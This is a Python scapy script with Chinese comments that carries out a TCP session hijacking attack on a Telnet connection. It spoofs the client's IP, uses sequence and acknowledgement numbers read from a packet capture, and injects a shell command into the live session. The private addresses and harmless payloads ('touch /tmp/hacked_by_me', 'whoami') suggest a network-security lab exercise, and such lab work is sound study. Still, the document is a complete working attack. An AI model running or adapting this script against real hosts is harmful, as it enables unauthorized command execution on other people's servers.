#!/usr/bin/env python3
from scapy.all import *

# ============== 【手动配置区】根据你的最新抓包结果修改！ ==============
# 网络层：冒充客户端(10.9.0.6)给服务器(10.9.0.5)发包
src_ip = "10.9.0.6"      # 被冒充的客户端IP
dst_ip = "10.9.0.5"      # 目标服务器IP

# 传输层：关键参数来源于实时抓包
sport = 46614            # 【需更新】客户端当前使用的源端口
dport = 23               # 目标端口 (Telnet)
seq_num = 102841062      # 【需更新】伪造包的序列号。应为服务器期望从客户端收到的下一个seq。通常取最新【服务器->客户端】包的ACK值。
ack_num = 804150706      # 【需更新】伪造包的确认号。应为客户端期望从服务器收到的下一个seq。通常取最新【客户端->服务器】包的ACK值。

# 应用层：要注入的恶意命令（确保以 \r\n 结尾，模拟回车执行）
# 实验环境下，建议先用无害命令测试，如创建文件、打印消息等。
malicious_command = "touch /tmp/hacked_by_me \r\n"  # 创建一个文件作为攻击成功的证据
# malicious_command = "echo 'SESSION HIJACKED' > /tmp/flag.txt \r\n"
# malicious_command = "whoami \r\n"
# ================================================================

print("[*] 开始手动TCP会话劫持攻击...")
print(f"[* 目标会话: {src_ip}:{sport} -> {dst_ip}:{dport}")
print(f"[*] 使用 Seq: {seq_num}, Ack: {ack_num}")
print(f"[*] 注入命令: {repr(malicious_command)}")

# 构造数据包
ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)  # PSH+ACK标志，表示携带数据
data = malicious_command
pkt = ip / tcp / data

print("[*] 构造的恶意数据包结构：")
ls(pkt)  # 显示包结构用于最终校验
print("\n[*] 发送恶意数据包...")
send(pkt, verbose=1)
print("[+] 攻击完成。请检查服务器上是否执行了命令（如 /tmp/hacked_by_me 文件是否存在）。")